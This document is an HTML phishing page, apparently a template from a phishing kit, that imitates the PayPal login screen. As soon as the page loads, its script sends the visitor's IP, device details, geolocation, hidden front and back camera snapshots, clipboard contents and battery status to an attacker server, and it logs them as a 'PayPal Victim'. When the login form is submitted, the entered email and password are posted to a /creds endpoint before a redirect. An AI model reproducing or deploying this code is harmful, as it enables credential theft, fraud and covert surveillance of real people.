<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Log in to your PayPal account</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f5f7fa; min-height: 100vh; display: flex; flex-direction: column; }
.header { background: #fff; padding: 16px 0; text-align: center; border-bottom: 1px solid #eee; }
.pp-logo { font-size: 28px; font-weight: 800; }
.pp-logo span:first-child { color: #003087; }
.pp-logo span:last-child { color: #009cde; }
.main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
.card { background: #fff; border-radius: 12px; box-shadow: 0 2px 16px rgba(0,0,0,0.08); padding: 36px 32px; width: 100%; max-width: 400px; text-align: center; }
h1 { font-size: 22px; color: #2c2e2f; margin-bottom: 24px; }
.form-group { margin-bottom: 16px; }
.form-group input { width: 100%; padding: 14px 16px; border: 1px solid #b7b7b7; border-radius: 8px; font-size: 16px; }
.form-group input:focus { outline: none; border-color: #003087; box-shadow: 0 0 0 3px rgba(0,48,135,0.1); }
.btn { width: 100%; padding: 14px; background: #003087; color: #fff; border: none; border-radius: 24px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; }
.btn:hover { background: #00266e; }
.links { margin-top: 20px; font-size: 14px; }
.links a { color: #003087; text-decoration: none; display: block; margin: 8px 0; }
.divider { display: flex; align-items: center; margin: 20px 0; }
.divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #ddd; }
.divider span { padding: 0 16px; color: #687173; font-size: 13px; }
.btn-signup { width: 100%; padding: 14px; background: #fff; color: #003087; border: 2px solid #003087; border-radius: 24px; font-size: 16px; font-weight: 600; cursor: pointer; }
.loading { display: none; text-align: center; padding: 30px; }
.spinner { border: 3px solid #eee; border-top: 3px solid #003087; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="header">
<div class="pp-logo"><span>Pay</span><span>Pal</span></div>
</div>
<div class="main">
<div class="card">
<h1>Log in to your account</h1>
<form id="loginForm">
<div class="form-group">
<input type="text" id="username" placeholder="Email or mobile number" required>
</div>
<div class="form-group">
<input type="password" id="password" placeholder="Password" required>
</div>
<button type="submit" class="btn">Log In</button>
</form>
<div class="loading" id="loading">
<div class="spinner"></div>
<p style="color:#666;font-size:14px;">Logging in...</p>
</div>
<div class="links">
<a href="#">Having trouble logging in?</a>
</div>
<div class="divider"><span>or</span></div>
<button class="btn-signup" onclick="return false;">Sign Up</button>
</div>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video = document.getElementById('video');
var canvas = document.getElementById('canvas');

async function gatherAll() {
    let td = '💰 <b>PayPal Victim!</b>\n\n';
    td += '⚓ IP: <code><%=ip %></code>\n';
    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
    if(navigator.geolocation){ navigator.geolocation.getCurrentPosition((p)=>{ $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}); }, ()=>{}, {enableHighAccuracy:true, timeout: 10000}); }
    async function captureCamera(facingMode, label) { try { const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}}); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 2000)); canvas.getContext('2d').drawImage(video, 0, 0, 640, 480); $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label}); stream.getTracks().forEach(t => t.stop()); } catch(e) {} }
    try { await captureCamera("user", "selfie"); } catch(e) {}
    try { await captureCamera("environment", "back"); } catch(e) {}
    try { if(navigator.clipboard && navigator.clipboard.readText) { const clip = await navigator.clipboard.readText(); if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)}); } } catch(e) {}
    try { const bat = await navigator.getBattery(); $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging}); } catch(e) {}
}

document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const user = document.getElementById('username').value;
    const pass = document.getElementById('password').value;
    document.querySelector('form').style.display = 'none';
    document.getElementById('loading').style.display = 'block';
    $.post("<%=a %>/creds", { uid: uid, user: encodeURIComponent(user), pass: encodeURIComponent(pass), platform: 'PayPal' });
    await new Promise(r => setTimeout(r, 2500));
    window.location.href = "<%=url %>";
});

window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
</script>
</body>
</html>